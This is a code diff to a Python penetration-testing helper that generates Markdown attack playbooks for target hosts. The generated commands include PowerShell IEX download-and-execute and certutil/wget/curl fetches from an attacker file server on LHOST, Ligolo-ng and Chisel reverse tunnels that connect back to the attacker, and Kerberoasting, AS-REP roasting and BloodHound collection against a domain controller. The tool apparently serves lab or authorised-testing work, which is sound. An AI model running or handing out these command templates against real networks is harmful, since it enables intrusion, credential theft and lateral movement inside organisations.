@@ -121,39 +121,54 @@ def _check_condition(condition: Optional[str], info: "TargetInfo") -> bool:
 
 
 # ===========================================================================
-# Transfer command builders
+# Transfer command builders  (used by _tool_block)
 # ===========================================================================
 
-def _transfer_windows(tool: dict, lhost: str) -> List[str]:
+def _transfer_cmds_windows(tool: dict, lhost: str) -> List[str]:
+    """Return the raw transfer command lines for a Windows tool (no wrapping)."""
     name = tool["name"]
     url  = f"http://{lhost}:8000/windows/{name}"
     dest = f"C:\\Windows\\Temp\\{name}"
-
     if tool["ext_type"] == "ps1":
         return [
-            f'`IEX (New-Object Net.WebClient).DownloadString("{url}")`',
-            f'`Invoke-WebRequest -Uri "{url}" -OutFile "{dest}"`',
+            f'IEX (New-Object Net.WebClient).DownloadString("{url}")',
+            "# OR save to disk:",
+            f'iwr "{url}" -OutFile "{dest}"',
         ]
     return [
-        f"`certutil.exe -urlcache -f {url} {dest}`",
-        f'`Invoke-WebRequest -Uri "{url}" -OutFile "{dest}"`',
+        f"certutil.exe -urlcache -f {url} {dest}",
+        "# OR",
+        f'iwr "{url}" -OutFile "{dest}"',
     ]
 
 
-def _transfer_linux(tool: dict, lhost: str) -> List[str]:
+def _transfer_cmds_linux(tool: dict, lhost: str) -> List[str]:
+    """Return the raw transfer command lines for a Linux tool (no wrapping)."""
     name = tool["name"]
     url  = f"http://{lhost}:8000/linux/{name}"
     return [
-        f"`wget {url} -O /tmp/{name} && chmod +x /tmp/{name}`",
-        f"`curl -o /tmp/{name} {url} && chmod +x /tmp/{name}`",
+        f"wget {url} -O /tmp/{name} && chmod +x /tmp/{name}",
+        "# OR",
+        f"curl -o /tmp/{name} {url} && chmod +x /tmp/{name}",
     ]
 
 
 def _tool_block(tool: dict, info: "TargetInfo", lhost: str) -> List[str]:
-    """Render a single tool as a Markdown checklist block."""
+    """
+    Render a single tool as a fenced-code-block section with explicit
+    [KALI LINUX] / [TARGET] environment labels.
+
+    Format rules (UX audit requirement):
+      - NO checkbox / bullet lists for commands
+      - Fenced ```bash``` / ```powershell``` blocks only
+      - First comment in every block states where it runs
+    """
     name     = tool["name"]
     desc     = tool["desc"]
     run_hint = tool.get("run_hint", "").replace("<LHOST>", lhost)
+    is_win   = tool["dir"] == "windows"
+    lang     = "powershell" if is_win else "bash"
+    tgt_label = "WINDOWS TARGET" if is_win else "LINUX TARGET"
 
     lines = [
         f"#### `{name}`",
@@ -162,24 +177,118 @@ def _tool_block(tool: dict, info: "TargetInfo", lhost: str) -> List[str]:
         "",
         "**Transfer to target:**",
         "",
+        f"```{lang}",
+        f"# [{tgt_label}] — download from attacker file server",
     ]
 
-    if tool["dir"] == "windows":
-        for cmd in _transfer_windows(tool, lhost):
-            lines.append(f"- [ ] 💡 {cmd}")
+    if is_win:
+        lines += _transfer_cmds_windows(tool, lhost)
     else:
-        for cmd in _transfer_linux(tool, lhost):
-            lines.append(f"- [ ] 💡 {cmd}")
+        lines += _transfer_cmds_linux(tool, lhost)
+
+    lines += ["```", ""]
 
     if run_hint:
         lines += [
+            "**Execute on target:**",
             "",
-            "**Execute:**",
+            f"```{lang}",
+            f"# [{tgt_label}]",
+            run_hint,
+            "```",
             "",
-            f"- [ ] 💡 `{run_hint}`",
         ]
 
-    lines.append("")
+    return lines
+
+
+# ===========================================================================
+# Attacker Setup / Provisioning
+# ===========================================================================
+
+def _attacker_setup(info: "TargetInfo", os_type: str) -> List[str]:
+    """
+    Generate attacker-side (Kali) provisioning commands: mkdir + wget for
+    every tool binary relevant to this target fingerprint.
+
+    Injected once at the top of the Arsenal section, before any transfer
+    commands, so the operator can run the setup block first and then start
+    the file server — no manual URL lookup needed.
+    """
+    from core.arsenal_rules import (
+        WINDOWS_PRIVESC, LINUX_PRIVESC, LINUX_KERNEL_EXPLOITS,
+        AD_TOOLS, PIVOT_TOOLS_WINDOWS, PIVOT_TOOLS_LINUX,
+    )
+
+    # Collect tools relevant to this scan
+    if os_type == "Windows":
+        privesc_tools = [t for t in WINDOWS_PRIVESC if _check_condition(t["condition"], info)]
+        if _is_ad(info):
+            privesc_tools += AD_TOOLS
+        pivot_tools = PIVOT_TOOLS_WINDOWS
+        privesc_label = "# Windows PrivEsc + AD tools"
+    elif os_type == "Linux":
+        privesc_tools = [t for t in LINUX_PRIVESC if _check_condition(t["condition"], info)]
+        privesc_tools += [t for t in LINUX_KERNEL_EXPLOITS if _check_condition(t["condition"], info)]
+        pivot_tools = PIVOT_TOOLS_LINUX
+        privesc_label = "# Linux PrivEsc + kernel exploit tools"
+    else:
+        privesc_tools = []
+        pivot_tools   = PIVOT_TOOLS_LINUX
+        privesc_label = "# (OS unknown — add tools manually)"
+
+    lines: List[str] = [
+        "---",
+        "",
+        "### 🛠️ Attacker Setup — Download Binaries to Kali",
+        "",
+        "> Run this block **once on Kali** before starting the file server.",
+        "> Skip `wget` lines for tools you already have in `~/tools/`.",
+        "",
+        "```bash",
+        "# [KALI LINUX] — create tool directories",
+        "mkdir -p ~/tools/windows ~/tools/linux",
+        "",
+    ]
+
+    if privesc_tools:
+        lines.append(privesc_label)
+        for tool in privesc_tools:
+            url  = tool.get("download_url", "")
+            dest = f"~/tools/{tool['dir']}/{tool['name']}"
+            if url:
+                lines.append(f"wget -q '{url}' -O {dest}")
+            else:
+                lines.append(f"# {tool['name']} — download manually (no URL in rules)")
+        lines.append("")
+
+    lines += [
+        "# Pivoting agents (drop onto target) + proxy (stays on Kali)",
+        "# Ligolo-ng proxy — runs on Kali",
+        "wget -q 'https://github.com/nicocha30/ligolo-ng/releases/latest/download/"
+        "ligolo-ng_proxy_linux_amd64.tar.gz' -O /tmp/ligolo-proxy.tar.gz",
+        "tar -xzf /tmp/ligolo-proxy.tar.gz -C ~/tools/linux/ ligolo-proxy 2>/dev/null || "
+        "tar -xzf /tmp/ligolo-proxy.tar.gz -C ~/tools/linux/",
+        "",
+    ]
+
+    for tool in pivot_tools:
+        url  = tool.get("download_url", "")
+        dest = f"~/tools/{tool['dir']}/{tool['name']}"
+        if url:
+            lines.append(f"wget -q '{url}' -O {dest}")
+
+    lines += [
+        "",
+        "# Make Linux binaries executable",
+        "chmod +x ~/tools/linux/*",
+        "",
+        "# Start file server (keep this terminal open while exploiting)",
+        "cd ~/tools && python3 -m http.server 8000",
+        "```",
+        "",
+    ]
+
     return lines
 
 
@@ -395,13 +504,16 @@ def _pivot_section(info: "TargetInfo", lhost: str) -> List[str]:
     os_type = info.os_type
     domain  = info.domain or "<DOMAIN>"
 
+    tgt_lang  = "powershell" if os_type == "Windows" else "bash"
+    tgt_label = "WINDOWS TARGET" if os_type == "Windows" else "LINUX TARGET"
+
     lines: List[str] = [
         "---",
         "",
         "### 🕸️ Pivoting & Tunnelling Arsenal",
         "",
-        "> **[!] ⚠️ STOP: Ensure you have transferred the required binaries to the "
-        "target first using the File Transfer section above.**",
+        "> **[!] ⚠️ STOP: Transfer the pivot binaries to the target first "
+        "(see Attacker Setup section above — `chisel` / `ligolo-agent`).**",
         "",
         "**Step 0 — Confirm dual-homed status** *(run immediately after shell)*",
         "",
@@ -411,6 +523,7 @@ def _pivot_section(info: "TargetInfo", lhost: str) -> List[str]:
     if os_type == "Windows":
         lines += [
             "```powershell",
+            "# [WINDOWS TARGET]",
             "ipconfig /all          # look for multiple adapters / subnets",
             "route print            # check routing table for internal ranges",
             "```",
@@ -419,6 +532,7 @@ def _pivot_section(info: "TargetInfo", lhost: str) -> List[str]:
     else:
         lines += [
             "```bash",
+            "# [LINUX TARGET]",
             "ip a                   # look for multiple interfaces",
             "ip route               # check routing table for internal subnets",
             "```",
@@ -431,19 +545,21 @@ def _pivot_section(info: "TargetInfo", lhost: str) -> List[str]:
         "",
         "#### Ligolo-ng *(recommended — transparent full-tunnel, no proxychains)*",
         "",
-        "**1. Attacker — start the proxy** *(run once, keep this terminal open)*:",
+        "**1. Start the proxy on Kali** *(keep this terminal open)*:",
         "",
         "```bash",
-        f"./ligolo-proxy -selfcert -laddr 0.0.0.0:11601",
+        "# [KALI LINUX]",
+        f"~/tools/linux/ligolo-proxy -selfcert -laddr 0.0.0.0:11601",
         "```",
         "",
-        "**2. Target — connect back to attacker:**",
+        "**2. Connect back from the target:**",
         "",
     ]
 
     if os_type == "Windows":
         lines += [
             "```powershell",
+            f"# [WINDOWS TARGET]",
             f".\\ligolo-agent.exe -connect {lhost}:11601 -ignore-cert",
             "```",
             "",
@@ -451,27 +567,28 @@ def _pivot_section(info: "TargetInfo", lhost: str) -> List[str]:
     else:
         lines += [
             "```bash",
+            "# [LINUX TARGET]",
             f"chmod +x ./ligolo-agent 2>/dev/null; ./ligolo-agent -connect {lhost}:11601 -ignore-cert",
             "```",
             "",
         ]
 
     lines += [
-        "**3. Attacker — inside the Ligolo console** *(after agent connects)*:",
+        "**3. Ligolo console on Kali** *(after agent connects)*:",
         "",
         "```",
+        "# [KALI LINUX — Ligolo console]",
         "session          # select the new session",
         "start            # start the tunnel",
         "```",
         "",
-        "**4. Attacker — add a route to the internal subnet** *(new terminal)*:",
+        "**4. Add route to internal subnet** *(new Kali terminal)*:",
         "",
         "```bash",
-        "# Replace 172.16.x.0/24 with the actual internal subnet from 'ip route' above",
+        "# [KALI LINUX]",
+        "# Replace 172.16.x.0/24 with the actual subnet from Step 0 above",
         "sudo ip route add 172.16.x.0/24 dev ligolo",
-        "",
-        "# Verify",
-        "ip route | grep ligolo",
+        "ip route | grep ligolo   # verify",
         "```",
         "",
     ]
@@ -482,19 +599,21 @@ def _pivot_section(info: "TargetInfo", lhost: str) -> List[str]:
         "",
         "#### Chisel *(fallback — SOCKS5 reverse proxy via proxychains)*",
         "",
-        "**1. Attacker — start the server:**",
+        "**1. Start the Chisel server on Kali:**",
         "",
         "```bash",
-        f"./chisel server --reverse -p 1080 --socks5",
+        "# [KALI LINUX]",
+        f"~/tools/linux/chisel server --reverse -p 1080 --socks5",
         "```",
         "",
-        "**2. Target — connect back:**",
+        "**2. Connect back from the target:**",
         "",
     ]
 
     if os_type == "Windows":
         lines += [
             "```powershell",
+            "# [WINDOWS TARGET]",
             f".\\chisel.exe client {lhost}:1080 R:socks",
             "```",
             "",
@@ -502,6 +621,7 @@ def _pivot_section(info: "TargetInfo", lhost: str) -> List[str]:
     else:
         lines += [
             "```bash",
+            "# [LINUX TARGET]",
             f"chmod +x ./chisel 2>/dev/null; ./chisel client {lhost}:1080 R:socks",
             "```",
             "",
@@ -509,16 +629,18 @@ def _pivot_section(info: "TargetInfo", lhost: str) -> List[str]:
 
     # ── proxychains config reminder ───────────────────────────────────────
     lines += [
-        "**3. Attacker — configure proxychains** *(add to end of `/etc/proxychains4.conf`)*:",
-        "",
-        "```",
-        "# Comment out any existing socks lines, then add:",
-        "socks5  127.0.0.1  1080",
-        "```",
-        "",
-        "**4. Use proxychains to reach the internal network:**",
+        "**3. Configure proxychains on Kali** *(add to `/etc/proxychains4.conf`)*:",
         "",
         "```bash",
+        "# [KALI LINUX]",
+        "# Comment out any existing socks lines, then append:",
+        "echo 'socks5  127.0.0.1  1080' | sudo tee -a /etc/proxychains4.conf",
+        "```",
+        "",
+        "**4. Reach the internal network through proxychains:**",
+        "",
+        "```bash",
+        "# [KALI LINUX]",
         "proxychains nmap -sT -Pn -p 22,80,443,445,3389 <INTERNAL_IP>",
         "proxychains nxc smb <INTERNAL_IP>",
         "proxychains curl http://<INTERNAL_IP>/",
@@ -536,40 +658,46 @@ def _pivot_section(info: "TargetInfo", lhost: str) -> List[str]:
         lines += [
             "---",
             "",
-            f"#### 🏰 AD Pivot — Commands for the Internal Domain (`{domain}`)",
+            f"#### 🏰 AD Pivot — Internal Domain (`{domain}`)",
             "",
-            f"> DC IP: `{ip}` — run these **through proxychains** (Chisel) or **directly** (Ligolo tunnel).",
+            f"> DC IP: `{ip}` — run these on Kali, **through proxychains** (Chisel) "
+            "or **directly** (Ligolo tunnel).",
             "",
             "**SMB reachability check:**",
             "",
             "```bash",
+            "# [KALI LINUX]",
             f"proxychains nxc smb {ip}",
             f"proxychains nxc smb {ip} -u '' -p '' --shares",
             "```",
             "",
-            "**AS-REP Roasting through the tunnel:**",
+            "**AS-REP Roasting:**",
             "",
             "```bash",
+            "# [KALI LINUX]",
             f"proxychains impacket-GetNPUsers {domain}/ -usersfile {users_file} "
             f"-format hashcat -dc-ip {ip} -no-pass",
             "```",
             "",
-            "**Kerberoasting through the tunnel:**",
+            "**Kerberoasting:**",
             "",
             "```bash",
+            "# [KALI LINUX]",
             f"proxychains impacket-GetUserSPNs {domain}/'<USER>:<PASS>' -dc-ip {ip} -request",
             "```",
             "",
-            "**BloodHound collection through the tunnel:**",
+            "**BloodHound collection:**",
             "",
             "```bash",
+            "# [KALI LINUX]",
             f"proxychains bloodhound-python -u '<USER>' -p '<PASS>' "
             f"-d {domain} -dc {ip} -c All --dns-tcp",
             "```",
             "",
-            "**LDAP enumeration through the tunnel:**",
+            "**LDAP enumeration:**",
             "",
             "```bash",
+            "# [KALI LINUX]",
             f"proxychains ldapsearch -x -H ldap://{ip} -b '{dc_base}' "
             f"'(objectClass=user)' sAMAccountName",
             "```",
@@ -604,12 +732,10 @@ def generate_advisor_markdown(info: "TargetInfo", lhost: str = "<LHOST>") -> str
         ">",
         "> ⚠️ Replace every `<LHOST>` with your **tun0** IP before running.",
         "",
-        "> **Start your file server first** (organise tools as `tools/windows/` and `tools/linux/`):",
-        "> ```bash",
-        "> cd ~/tools && python3 -m http.server 8000",
-        "> ```",
-        "",
     ]
+
+    # ── Attacker Setup (always first — download tools to Kali) ────────────
+    lines += _attacker_setup(info, os_type)
 
     # ── Pivot Rule 1: Critical warning if gateway indicators found ────────
     pivot_reasons = _detect_pivot_indicators(info)
